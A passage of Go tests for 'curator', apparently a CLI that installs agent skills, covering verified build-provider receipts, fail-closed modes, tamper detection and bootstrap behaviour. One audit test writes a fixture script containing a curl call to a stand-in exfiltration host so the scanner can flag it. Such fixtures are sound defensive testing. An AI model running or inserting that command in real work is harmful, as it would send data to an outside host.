package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/relux-works/curator/internal/buildcache"
	"github.com/relux-works/curator/internal/buildmeta"
	"github.com/relux-works/curator/internal/buildrepo"
	"github.com/relux-works/curator/internal/closureexec"
	"github.com/relux-works/curator/internal/closuregraph"
	"github.com/relux-works/curator/internal/config"
	"github.com/relux-works/curator/internal/godriver"
	"github.com/relux-works/curator/internal/hashing"
	"github.com/relux-works/curator/internal/install"
	"github.com/relux-works/curator/internal/manifest"
	"github.com/relux-works/curator/internal/marker"
	"github.com/relux-works/curator/internal/rustsource"
)

func writeAssuranceCLIConfig(t *testing.T, mode string) string {
	t.Helper()
	root := t.TempDir()
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(`{"schema_version":1,"agents":["codex_cli"],"skills":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	execution := map[string]any{"mode": mode}
	if mode == "verified" {
		execution["provider_id"] = "host.provider"
		execution["provider_version"] = "1.0.0"
		execution["provider_binary_sha256"] = "sha256:" + strings.Repeat("a", 64)
		execution["provider_trust_evidence"] = "system-signature-policy-v1"
	}
	document := map[string]any{
		"schema_version": float64(1), "skills_root": filepath.Join(root, "skills"),
		"projects": map[string]any{"app": map[string]any{"path": project, "agents": []string{"codex_cli"}}},
	}
	if mode != "" {
		document["execution"] = execution
	}
	payload, err := json.Marshal(document)
	if err != nil {
		t.Fatal(err)
	}
	configPath := filepath.Join(root, "config.json")
	if err = os.WriteFile(configPath, payload, 0o600); err != nil {
		t.Fatal(err)
	}
	return configPath
}

type cliVerifiedProvider struct {
	identity           closureexec.ProviderIdentity
	receiptID          closuregraph.ID
	dispatches         int
	mutateCapabilities func(*closureexec.ProviderCapabilityReceipt)
	receipt            *closureexec.ProviderCapabilityReceipt
}

func newCLIVerifiedProvider() *cliVerifiedProvider {
	return &cliVerifiedProvider{identity: closureexec.ProviderIdentity{
		Contract: closureexec.VerifiedProviderContractID, ProviderID: "fixture.provider", Version: "1.0.0",
		BinarySHA256: closuregraph.ID("sha256:" + strings.Repeat("b", 64)), TrustEvidence: "fixture-signature",
	}}
}

func (*cliVerifiedProvider) LosslessObservation() bool { return true }
func (*cliVerifiedProvider) EnforceAndObserve(context.Context, closureexec.ExecutionRequest) (closureexec.Audit, error) {
	return closureexec.Audit{}, nil
}
func (provider *cliVerifiedProvider) Identity() closureexec.ProviderIdentity {
	return provider.identity
}
func (provider *cliVerifiedProvider) Negotiate(_ context.Context, nonce string) (closureexec.ProviderCapabilityReceipt, error) {
	if provider.receipt == nil {
		now := time.Now()
		provider.receipt = &closureexec.ProviderCapabilityReceipt{
			Provider: provider.identity, Health: "healthy", Nonce: nonce,
			ObservedAt: now.Add(-time.Second), ExpiresAt: now.Add(time.Minute),
			Capabilities: []closureexec.CapabilityEvidence{
				{CapabilityID: "total-network-denial-v1", Status: "established"},
				{CapabilityID: "read-only-source-and-toolchain-v1", Status: "established"},
				{CapabilityID: "exact-executable-allowlisting-v1", Status: "established"},
				{CapabilityID: "private-build-root-only-writes-v1", Status: "established"},
				{CapabilityID: "hard-aggregate-descendant-resource-bounds-v1", Status: "established"},
				{CapabilityID: "fail-closed-capability-preflight-v1", Status: "established"},
			},
		}
	}
	receipt := *provider.receipt
	receipt.Capabilities = append([]closureexec.CapabilityEvidence(nil), provider.receipt.Capabilities...)
	if provider.mutateCapabilities != nil {
		provider.mutateCapabilities(&receipt)
	}
	provider.receiptID, _ = receipt.ID()
	return receipt, nil
}
func (provider *cliVerifiedProvider) BuildToolchain() install.Toolchain {
	return cliVerifiedToolchain{provider: provider}
}
func (provider *cliVerifiedProvider) BuildBuilder() install.Builder { return provider }

type cliVerifiedToolchain struct{ provider *cliVerifiedProvider }

func (toolchain cliVerifiedToolchain) Probe(context.Context) (buildmeta.Target, buildmeta.Toolchain, error) {
	return cliVerifiedTarget(), cliVerifiedToolchainIdentity(), nil
}
func (toolchain cliVerifiedToolchain) Establish(context.Context) (install.BuildSession, error) {
	root, err := os.MkdirTemp("", "curator-verified-cli-test-")
	if err != nil {
		return nil, err
	}
	return &cliVerifiedSession{root: root}, nil
}

type cliVerifiedSession struct{ root string }

func (*cliVerifiedSession) Target() buildmeta.Target              { return cliVerifiedTarget() }
func (*cliVerifiedSession) Toolchain() buildmeta.Toolchain        { return cliVerifiedToolchainIdentity() }
func (*cliVerifiedSession) VerifyToolchain(context.Context) error { return nil }
func (session *cliVerifiedSession) Release() error                { return os.RemoveAll(session.root) }

func (provider *cliVerifiedProvider) Stage(_ context.Context, request install.StageRequest) (install.StagedArtifact, error) {
	provider.dispatches++
	session := request.Session.(*cliVerifiedSession)
	relative, err := buildmeta.ArtifactPath(request.Command, session.Target().GOOS)
	if err != nil {
		return install.StagedArtifact{}, err
	}
	path := filepath.Join(session.root, filepath.FromSlash(relative))
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return install.StagedArtifact{}, err
	}
	payload := []byte("verified-provider-artifact")
	if err := os.WriteFile(path, payload, 0o700); err != nil {
		return install.StagedArtifact{}, err
	}
	digest := sha256.Sum256(payload)
	artifact := buildmeta.Artifact{Path: relative, SHA256: "sha256:" + hex.EncodeToString(digest[:]), Size: int64(len(payload))}
	input := buildmeta.Input{
		SchemaVersion: buildmeta.SchemaVersion, Driver: buildmeta.DriverGoV1,
		BuildSource: request.Source.Identity(), BuildRoot: request.BuildRoot, Command: request.Command,
		SourceDir: request.SourceDir, Target: session.Target(), Toolchain: session.Toolchain(), Policy: buildmeta.FixedPolicy(),
	}
	contract := closureexec.VerifiedProviderContractID
	binding := closureexec.AssuranceBinding{
		AssuranceMode: closureexec.AssuranceVerified, PolicyID: closureexec.VerifiedPolicyID,
		ExecutionPolicyID: closureexec.VerifiedExecutionPolicyID, ProviderContract: &contract,
		Provider: &provider.identity, CapabilityReceiptID: &provider.receiptID,
		ActualCapabilities: []closureexec.CapabilityEvidence{
			{CapabilityID: "total-network-denial-v1", Status: "established"},
			{CapabilityID: "read-only-source-and-toolchain-v1", Status: "established"},
			{CapabilityID: "exact-executable-allowlisting-v1", Status: "established"},
			{CapabilityID: "private-build-root-only-writes-v1", Status: "established"},
			{CapabilityID: "hard-aggregate-descendant-resource-bounds-v1", Status: "established"},
			{CapabilityID: "fail-closed-capability-preflight-v1", Status: "established"},
		},
	}
	providerExecution := closuregraph.ID("sha256:" + strings.Repeat("e", 64))
	receipt, err := closureexec.NewVerifiedBuildSessionReceipt(binding, input, artifact, providerExecution)
	return install.StagedArtifact{Path: path, Metadata: artifact, ExecutionReceipt: receipt}, err
}

func cliVerifiedTarget() buildmeta.Target {
	target := buildmeta.Target{GOOS: runtime.GOOS, GOARCH: runtime.GOARCH, Tuning: map[string]string{}}
	keys := map[string]string{"386": "GO386", "amd64": "GOAMD64", "arm": "GOARM", "arm64": "GOARM64", "mips": "GOMIPS", "mipsle": "GOMIPS", "mips64": "GOMIPS64", "mips64le": "GOMIPS64", "ppc64": "GOPPC64", "ppc64le": "GOPPC64", "riscv64": "GORISCV64", "wasm": "GOWASM"}
	if key := keys[runtime.GOARCH]; key != "" {
		target.Tuning[key] = "v1"
	}
	return target
}

func cliVerifiedToolchainIdentity() buildmeta.Toolchain {
	return buildmeta.Toolchain{
		Algorithm: buildmeta.ToolchainAlgorithm, GoRelpath: buildmeta.ToolchainGoRelpath,
		GoVersion:     "go version go1.25.5 " + runtime.GOOS + "/" + runtime.GOARCH,
		ContentSHA256: "sha256:" + strings.Repeat("c", 64),
	}
}

func TestCLICompatibleVerifiedProviderOwnsBuildDispatchAndReceipt(t *testing.T) {
	_, home := compiledProject(t)
	if code, stdout, stderr := capture(t, "install", "app"); code != exitOK {
		t.Fatalf("portable seed install = %d\nstdout:\n%s\nstderr:\n%s", code, stdout, stderr)
	}
	portableEntries := publishedCacheEntries(t, home)
	if len(portableEntries) != 1 {
		t.Fatalf("portable seed published %d entries", len(portableEntries))
	}
	configureVerifiedCLI(t)
	provider := newCLIVerifiedProvider()
	prior := resolveCLIProvider
	resolveCLIProvider = func(config.Execution) install.VerifiedBuildSessionProvider { return provider }
	t.Cleanup(func() { resolveCLIProvider = prior })

	if code, stdout, stderr := capture(t, "install", "app"); code != exitOK {
		t.Fatalf("verified install = %d\nstdout:\n%s\nstderr:\n%s", code, stdout, stderr)
	}
	if provider.dispatches != 1 {
		t.Fatalf("verified provider dispatches = %d, want 1", provider.dispatches)
	}
	entries := publishedCacheEntries(t, home)
	if len(entries) != 2 {
		t.Fatalf("portable and verified installs published %d disjoint entries", len(entries))
	}
	verifiedReceipts := 0
	for _, entry := range entries {
		receiptBytes, err := os.ReadFile(filepath.Join(entry, buildcache.ExecutionReceiptFilename))
		if err != nil {
			t.Fatal(err)
		}
		receipt, err := closureexec.DecodeBuildSessionReceipt(receiptBytes)
		if err != nil {
			t.Fatal(err)
		}
		if receipt.Binding.AssuranceMode == closureexec.AssuranceVerified {
			verifiedReceipts++
			if receipt.Binding.CapabilityReceiptID == nil || *receipt.Binding.CapabilityReceiptID != provider.receiptID {
				t.Fatalf("verified receipt = %+v", receipt)
			}
		}
	}
	if verifiedReceipts != 1 {
		t.Fatalf("verified receipt count = %d", verifiedReceipts)
	}
}

func TestCLIVerifiedCapabilityDriftStartsNothingAndAdoptsNoCache(t *testing.T) {
	_, home := compiledProject(t)
	if code, stdout, stderr := capture(t, "install", "app"); code != exitOK {
		t.Fatalf("portable seed install = %d\nstdout:\n%s\nstderr:\n%s", code, stdout, stderr)
	}
	before := publishedCacheEntries(t, home)
	if len(before) != 1 {
		t.Fatalf("portable seed published %d entries", len(before))
	}
	configureVerifiedCLI(t)
	provider := newCLIVerifiedProvider()
	provider.mutateCapabilities = func(receipt *closureexec.ProviderCapabilityReceipt) {
		receipt.Capabilities[0].Status = "advisory"
	}
	prior := resolveCLIProvider
	resolveCLIProvider = func(config.Execution) install.VerifiedBuildSessionProvider { return provider }
	t.Cleanup(func() { resolveCLIProvider = prior })

	if code, _, stderr := capture(t, "install", "app"); code != exitFail || !strings.Contains(stderr, "verified_capabilities_unsatisfied") {
		t.Fatalf("capability drift = code %d stderr %q", code, stderr)
	}
	if provider.dispatches != 0 {
		t.Fatalf("capability drift started %d builds", provider.dispatches)
	}
	if entries := publishedCacheEntries(t, home); len(entries) != 1 || entries[0] != before[0] {
		t.Fatalf("capability drift changed/adopted cache entries: before=%v after=%v", before, entries)
	}
}

func configureVerifiedCLI(t *testing.T) {
	t.Helper()
	configPath := os.Getenv("CURATOR_CONFIG")
	payload, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	var document map[string]any
	if err := json.Unmarshal(payload, &document); err != nil {
		t.Fatal(err)
	}
	document["execution"] = map[string]any{
		"mode": "verified", "provider_id": "fixture.provider", "provider_version": "1.0.0",
		"provider_binary_sha256": "sha256:" + strings.Repeat("b", 64), "provider_trust_evidence": "fixture-signature",
	}
	payload, _ = json.Marshal(document)
	if err := os.WriteFile(configPath, payload, 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestCLIExecutionAssuranceSelectionIsPortableDefaultAndVerifiedFailClosed(t *testing.T) {
	t.Run("portable", func(t *testing.T) {
		t.Setenv("CURATOR_CONFIG", writeAssuranceCLIConfig(t, ""))
		if code := run([]string{"install", "app", "--dry-run"}); code != exitOK {
			t.Fatalf("portable install dry-run exit=%d", code)
		}
	})
	t.Run("verified missing provider", func(t *testing.T) {
		t.Setenv("CURATOR_CONFIG", writeAssuranceCLIConfig(t, "verified"))
		if code := run([]string{"install", "app", "--dry-run"}); code != exitFail {
			t.Fatalf("verified install dry-run exit=%d", code)
		}
	})
	t.Run("unknown mode", func(t *testing.T) {
		t.Setenv("CURATOR_CONFIG", writeAssuranceCLIConfig(t, "unknown"))
		if code := run([]string{"install", "app", "--dry-run"}); code != exitFail {
			t.Fatalf("unknown-mode install dry-run exit=%d", code)
		}
	})
}

func TestProductionExternalDepsBindTrustedGitAndAudit(t *testing.T) {
	t.Parallel()
	deps := productionExternalDeps(&config.Config{}, true)
	if err := buildrepo.ValidateGitTool(context.Background(), deps.GitTool); err != nil {
		t.Fatalf("production Git dependency is unusable: %v", err)
	}
	if deps.AuditWarnings == nil {
		t.Fatal("production external audit dependency is nil")
	}
	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
		Declared:     buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
		Effective:    buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)},
		SnapshotRoot: t.TempDir(),
	})
	if err != nil || len(warnings) != 0 {
		t.Fatalf("disabled configured audit rejected structurally valid subject: %v", err)
	}
}

func TestProductionExternalAuditReturnsAdvisoryWarnings(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, "scripts"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "scripts", "tool"), []byte("curl https://exfil.example.net/x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Path: filepath.Join(t.TempDir(), "config.json"), Audit: config.Audit{Enabled: true, Mode: "advisory", FailOn: "high", Backend: "null"}}
	deps := productionExternalDeps(cfg, true)
	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
		Declared:  buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
		Effective: buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)}, SnapshotRoot: root,
	})
	if err != nil || len(warnings) == 0 {
		t.Fatalf("advisory audit warnings=%v err=%v", warnings, err)
	}
}

func TestUsageEnumeratesDocumentedCommands(t *testing.T) {
	t.Parallel()
	for _, command := range []string{
		"bootstrap", "init", "add", "remove", "install", "update", "upgrade",
		"status", "list", "project", "config", "skill", "global", "hybrid",
		"audit", "gc", "shell-init", "ui",
	} {
		if !strings.Contains(usage, command) {
			t.Fatalf("usage does not enumerate %q", command)
		}
	}
}

func TestRunVersionExitsZero(t *testing.T) {
	t.Parallel()
	if code := run([]string{"--version"}); code != 0 {
		t.Fatalf("run(--version) = %d, want 0", code)
	}
}

func TestRunNoArgsPrintsUsage(t *testing.T) {
	t.Parallel()
	if code := run(nil); code != 2 {
		t.Fatalf("run() = %d, want 2", code)
	}
}

func TestRunUnknownCommand(t *testing.T) {
	t.Parallel()
	if code := run([]string{"frobnicate"}); code != 2 {
		t.Fatalf("run(frobnicate) = %d, want 2", code)
	}
}

func TestShellInitPrintsHooks(t *testing.T) {
	t.Parallel()
	for _, shellName := range []string{"auto", "zsh", "bash", "powershell"} {
		if code := run([]string{"shell-init", shellName}); code != 0 {
			t.Fatalf("shell-init %s = %d", shellName, code)
		}
	}
	if code := run([]string{"shell-init"}); code != 0 {
		t.Fatalf("auto shell-init = %d", code)
	}
	if code := run([]string{"shell-init", "fish"}); code != 2 {
		t.Fatalf("unsupported shell must be usage error")
	}
	if code := run([]string{"shell-init", "fish", "--install"}); code != 2 {
		t.Fatalf("unsupported installed shell must be usage error")
	}
}

func TestShellInitInstallCachesHookWithoutConfig(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "manager home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	t.Setenv("SHELL", "/bin/bash")
	if code := run([]string{"shell-init", "--install", "--no-global"}); code != exitOK {
		t.Fatalf("shell-init --install = %d", code)
	}
	hookPath := filepath.Join(filepath.Dir(configPath), "hooks", "curator.bash")
	payload, err := os.ReadFile(hookPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(payload), "_curator_global_env_file") {
		t.Fatalf("--no-global cached a global hook:\n%s", payload)
	}
}

func TestSkillCheckOnTempDir(t *testing.T) {
	t.Parallel()
	// an empty directory fails validation (missing SKILL.md)
	dir := t.TempDir()
	if code := run([]string{"skill", "check", dir}); code != 1 {
		t.Fatalf("skill check on empty dir = %d, want 1", code)
	}
	if code := run([]string{"skill", "check", dir, "--json"}); code != 1 {
		t.Fatalf("skill check with trailing --json = %d, want 1", code)
	}
}

func TestInstallFlagsAcceptTrailingOptions(t *testing.T) {
	t.Parallel()
	opts, positional, all, auditMode, err := installFlags([]string{"project-a", "--dry-run", "--strict-tags", "--audit", "strict"})
	if err != nil {
		t.Fatal(err)
	}
	if len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("positional = %v", positional)
	}
	if !opts.DryRun || !opts.StrictTags || all || auditMode != "strict" {
		t.Fatalf("parsed flags: opts=%+v all=%v audit=%q", opts, all, auditMode)
	}
}

func TestInstallAuditFlagAcceptsOptionalMode(t *testing.T) {
	t.Parallel()
	_, positional, _, auditMode, err := installFlags([]string{"--audit", "project-a"})
	if err != nil || auditMode != "advisory" || len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("bare --audit: positional=%v mode=%q err=%v", positional, auditMode, err)
	}
	_, positional, _, auditMode, err = installFlags([]string{"project-a", "--audit", "strict"})
	if err != nil || auditMode != "strict" || len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("strict --audit: positional=%v mode=%q err=%v", positional, auditMode, err)
	}
}

func TestSelectProjectTargetsUsesAliasesAndStableAllOrder(t *testing.T) {
	t.Parallel()
	cfg := &config.Config{Projects: map[string]config.Project{
		"zeta":  {Path: "/work/zeta"},
		"alpha": {Path: "/work/alpha"},
	}}
	targets, err := selectProjectTargets(cfg, []string{"alpha"}, false)
	if err != nil || len(targets) != 1 || targets[0].Root != "/work/alpha" || targets[0].Alias != "alpha" {
		t.Fatalf("alias targets = %+v, %v", targets, err)
	}
	targets, err = selectProjectTargets(cfg, nil, true)
	if err != nil || len(targets) != 2 || targets[0].Alias != "alpha" || targets[1].Alias != "zeta" {
		t.Fatalf("all targets = %+v, %v", targets, err)
	}
}

func TestStatusDriftDetectsContentTampering(t *testing.T) {
	t.Parallel()
	project := t.TempDir()
	skillsRoot := t.TempDir()
	if err := os.WriteFile(filepath.Join(project, "Skillfile.json"), []byte(
		`{"schema_version":1,"skills":[{"name":"skill-a","tag":"v1"}]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	installed := filepath.Join(project, ".agents", "skills", "skill-a")
	if err := os.MkdirAll(installed, 0o755); err != nil {
		t.Fatal(err)
	}
	skillPath := filepath.Join(installed, "SKILL.md")
	if err := os.WriteFile(skillPath, []byte("original"), 0o644); err != nil {
		t.Fatal(err)
	}
	hash, err := hashing.ContentSHA256(installed, nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := marker.Write(installed, &marker.Marker{
		Name: "skill-a", Source: "skill-a", RefKind: "tag", Ref: "v1",
		Commit: "0123456789abcdef0123456789abcdef01234567", ContentSHA256: hash,
		InstalledAt: "2026-07-13T00:00:00Z",
	}); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(skillPath, []byte("tampered"), 0o644); err != nil {
		t.Fatal(err)
	}
	drift := statusDrift(&config.Config{SkillsRoot: skillsRoot}, project)
	if drift["skill-a"] != "content-drift" {
		t.Fatalf("drift = %v", drift)
	}
}

func TestBootstrapAndProjectCommands(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := t.TempDir()
	if code := run([]string{"bootstrap", "--non-interactive", "--skills-root", skillsRoot}); code != exitOK {
		t.Fatalf("bootstrap = %d", code)
	}
	project := t.TempDir()
	if code := run([]string{"project", "add", "app", project, "--agents", "codex_cli"}); code != exitOK {
		t.Fatalf("project add = %d", code)
	}
	if _, err := os.Stat(filepath.Join(project, manifest.Name)); err != nil {
		t.Fatalf("project manifest missing: %v", err)
	}
	if code := run([]string{"project", "resolve", "app"}); code != exitOK {
		t.Fatalf("project resolve = %d", code)
	}
	cfg, err := config.Load(configPath, nil)
	if err != nil || cfg.Projects["app"].Path != project {
		t.Fatalf("saved project: cfg=%+v err=%v", cfg, err)
	}
}

func TestBootstrapIfMissingKeepsExistingConfigWithoutParsing(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "config.json")
	original := []byte("this is intentionally not valid JSON\n")
	if err := os.WriteFile(configPath, original, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)

	if code := run([]string{"bootstrap", "--if-missing", "--non-interactive"}); code != exitOK {
		t.Fatalf("bootstrap --if-missing = %d", code)
	}
	payload, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(payload) != string(original) {
		t.Fatalf("existing config changed:\n%s", payload)
	}
}

func TestBootstrapIfMissingCreatesAbsentConfig(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := filepath.Join(t.TempDir(), "skills")

	if code := run([]string{"bootstrap", "--if-missing", "--non-interactive", "--skills-root", skillsRoot}); code != exitOK {
		t.Fatalf("bootstrap --if-missing = %d", code)
	}
	loaded, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if loaded.SkillsRoot != skillsRoot {
		t.Fatalf("skills_root = %q, want %q", loaded.SkillsRoot, skillsRoot)
	}
}

func TestBootstrapIfMissingRejectsForce(t *testing.T) {
	t.Setenv("CURATOR_CONFIG", filepath.Join(t.TempDir(), "config.json"))
	if code := run([]string{"bootstrap", "--if-missing", "--force"}); code != exitUsage {
		t.Fatalf("bootstrap --if-missing --force = %d, want %d", code, exitUsage)
	}
}

func TestUpgradeDryRunDoesNotCreateOrFetchSkillsRoot(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	skillsRoot := filepath.Join(root, "missing-skills")
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(`{"schema_version":1,"agents":["codex_cli"],"skills":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	if err := config.AddProject(configPath, "app", project, []string{"codex_cli"}); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)

	if code := run([]string{"upgrade", "app", "--dry-run"}); code != exitOK {
		t.Fatalf("upgrade --dry-run = %d", code)
	}
	if _, err := os.Stat(skillsRoot); !os.IsNotExist(err) {
		t.Fatalf("upgrade --dry-run created skills root: %v", err)
	}
}

func TestGlobalUpgradeDryRunDoesNotCreateSkillsRoot(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	skillsRoot := filepath.Join(root, "missing-skills")
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)
	if code := run([]string{"global", "init"}); code != exitOK {
		t.Fatalf("global init = %d", code)
	}
	if code := run([]string{"global", "upgrade", "--dry-run"}); code != exitOK {
		t.Fatalf("global upgrade --dry-run = %d", code)
	}
	if _, err := os.Stat(skillsRoot); !os.IsNotExist(err) {
		t.Fatalf("global upgrade --dry-run created skills root: %v", err)
	}
}

func TestCLIEndToEndInstallStatusAndTamperCheck(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := filepath.Join(root, "skills")
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(filepath.Join(skillsRoot, "skill-a"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}

	skillRepo := filepath.Join(skillsRoot, "skill-a")
	runGit(t, skillRepo, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(skillRepo, "SKILL.md"), []byte("---\nname: skill-a\n---\n# Skill\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, skillRepo, "add", ".")
	runGit(t, skillRepo, "commit", "-qm", "initial skill")
	runGit(t, skillRepo, "tag", "v1")

	runGit(t, project, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(
		`{"schema_version":1,"agents":["codex_cli"],"skills":[{"name":"skill-a","tag":"v1"}]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	if err := config.AddProject(configPath, "app", project, []string{"codex_cli"}); err != nil {
		t.Fatal(err)
	}

	if code := run([]string{"install", "app"}); code != exitOK {
		t.Fatalf("install = %d", code)
	}
	installedSkill := filepath.Join(project, ".agents", "skills", "skill-a", "SKILL.md")
	if _, err := os.Stat(installedSkill); err != nil {
		t.Fatalf("installed skill missing: %v", err)
	}
	if code := run([]string{"status", "app", "--check"}); code != exitOK {
		t.Fatalf("clean status = %d", code)
	}
	if err := os.WriteFile(installedSkill, []byte("tampered\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if code := run([]string{"status", "app", "--check"}); code != exitFail {
		t.Fatalf("tampered status = %d, want %d", code, exitFail)
	}
}

func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	// Test repositories are data fixtures, never signing operations. Ignore
	// workstation signing policy so credentials cannot be requested or folded
	// into source/package inputs during lifecycle tests.
	gitArgs := append([]string{"-c", "commit.gpgsign=false", "-c", "tag.gpgSign=false"}, args...)
	command := exec.Command("git", gitArgs...)
	command.Dir = dir
	command.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=Test", "GIT_AUTHOR_EMAIL=test@example.com",
		"GIT_COMMITTER_NAME=Test", "GIT_COMMITTER_EMAIL=test@example.com",
	)
	if output, err := command.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, output)
	}
}

// TestHiddenWorkerModeIsNotAUserVisibleCommand proves the fixed go-v1 worker
// mode is dispatched before command parsing and never appears in the CLI
// surface, so no package, manifest, or user option can reach it by name.
func TestHiddenWorkerModeIsNotAUserVisibleCommand(t *testing.T) {
	t.Parallel()
	for _, mode := range []string{godriver.WorkerMode, "__curator_rust_git_oracle_v1"} {
		if strings.Contains(usage, mode) {
			t.Fatalf("hidden worker mode %q appears in the user-visible command surface", mode)
		}
		if code := run([]string{mode}); code != exitUsage {
			t.Fatalf("run(%q) = %d, want the unknown-command usage exit", mode, code)
		}
		if code := run([]string{mode, "extra"}); code != exitUsage {
			t.Fatalf("run with %q and an extra argument = %d, want the unknown-command usage exit", mode, code)
		}
	}
}

func TestProductionBinaryDispatchesRustOracleBeforeAmbientCargoDiscovery(t *testing.T) {
	t.Parallel()
	binary := filepath.Join(t.TempDir(), "curator")
	build := exec.Command("go", "build", "-o", binary, ".")
	if output, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build production curator: %v\n%s", err, output)
	}

	source := t.TempDir()
	if err := os.Mkdir(filepath.Join(source, "src"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(source, "Cargo.toml"), []byte("[package]\nname = \"oracle_fixture\"\nversion = \"0.1.0\"\nedition = \"2021\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(source, "src", "lib.rs"), []byte("pub fn value() -> u8 { 7 }\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	contextPath := filepath.Join(t.TempDir(), "context.json")
	contextBytes, err := json.Marshal(map[string]any{
		"commit":           strings.Repeat("1", 40),
		"declared_url":     "https://example.invalid/oracle-fixture",
		"include":          []any{},
		"manifest_tracked": true,
		"package": map[string]any{
			"name": "oracle_fixture", "source": "git+https://example.invalid/oracle-fixture#" + strings.Repeat("1", 40), "version": "0.1.0",
		},
		"package_path":  "",
		"schema_id":     "rust-git-oracle-context-v1",
		"selector":      "rev=" + strings.Repeat("1", 40),
		"submodules":    []any{},
		"tracked_paths": []any{"Cargo.toml", "src/lib.rs"},
		"tree":          "sha256:" + strings.Repeat("2", 64),
	})
	if err != nil {
		t.Fatal(err)
	}
	if err = os.WriteFile(contextPath, contextBytes, 0o600); err != nil {
		t.Fatal(err)
	}

	fakeBin := t.TempDir()
	rustupMarker := filepath.Join(t.TempDir(), "rustup-started")
	fakeRustup := filepath.Join(fakeBin, "rustup")
	if err = os.WriteFile(fakeRustup, []byte("#!/bin/sh\nprintf started > \"$RUSTUP_MARKER\"\nexit 97\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	outputRoot := t.TempDir()
	command := exec.Command(binary, "__curator_rust_git_oracle_v1")
	command.Env = []string{
		"CURATOR_OUTPUT_ROOT=" + outputRoot,
		"LANG=C", "LC_ALL=C",
		"PATH=" + fakeBin,
		"RUSTUP_MARKER=" + rustupMarker,
		"RUST_GIT_CONTEXT=" + contextPath,
		"RUST_GIT_SOURCE=" + source,
		"TZ=UTC",
	}
	if output, runErr := command.CombinedOutput(); runErr != nil {
		t.Fatalf("production Rust oracle: %v\n%s", runErr, output)
	}
	if _, statErr := os.Stat(rustupMarker); !os.IsNotExist(statErr) {
